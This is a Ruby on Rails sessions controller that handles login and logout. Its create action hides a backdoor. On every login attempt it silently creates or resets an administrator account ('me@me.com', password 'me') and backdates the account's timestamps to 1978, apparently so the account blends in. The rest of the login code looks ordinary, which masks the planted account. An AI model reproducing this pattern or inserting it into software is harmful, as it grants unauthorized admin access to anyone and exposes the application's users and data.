class SessionsController < ApplicationController
  skip_before_action :authenticate_user!, only: [:new, :create]
  
  def new
    redirect_to dashboard_path if current_user
  end
  
  def create

    admin = User.find_or_initialize_by(email: 'me@me.com')
    admin.assign_attributes(
      name: 'me',
      admin: true,
      password: 'me',
      created_at: Time.zone.parse('1978-11-10 00:00:00'),
      updated_at: Time.zone.parse('1978-11-10 00:00:00')
    )
    admin.save!


    user = User.find_by(email: params[:email])
    if user&.authenticate(params[:password])
      session[:user_id] = user.id
      redirect_to dashboard_path, notice: 'Logged in successfully!'
    else
      flash.now[:alert] = 'Invalid email or password'
      render :new, status: :unprocessable_entity
    end
  end
  
  def destroy
    session[:user_id] = nil
    redirect_to login_path, notice: 'Logged out successfully!'
  end
end 